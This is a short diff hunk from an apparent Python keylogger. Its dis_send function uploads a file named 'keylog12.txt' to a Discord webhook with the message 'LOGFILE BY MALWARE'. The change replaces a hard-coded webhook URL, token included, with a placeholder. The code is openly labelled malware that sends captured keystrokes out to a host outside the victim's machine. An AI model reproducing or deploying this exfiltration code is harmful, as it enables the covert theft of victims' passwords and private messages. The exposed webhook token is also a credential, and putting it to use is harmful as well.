@@ -10,7 +10,7 @@ from dhooks import Webhook, File
 
 def dis_send():
     print("FILE_SENT")
-    hook = Webhook("https://discord.com/api/webhooks/1095710976298463313/_THZQn_yBvH2n3pPy4_vzapqMYuElbGLSKRzlGCQtHEahywXnmxkwm6ySvj1LPi0O_F5")
+    hook = Webhook("DISCORD_WEBHOOK_API")
     discord_file = File("keylog12.txt")
     hook.send("LOGFILE BY MALWARE",file=discord_file)
 
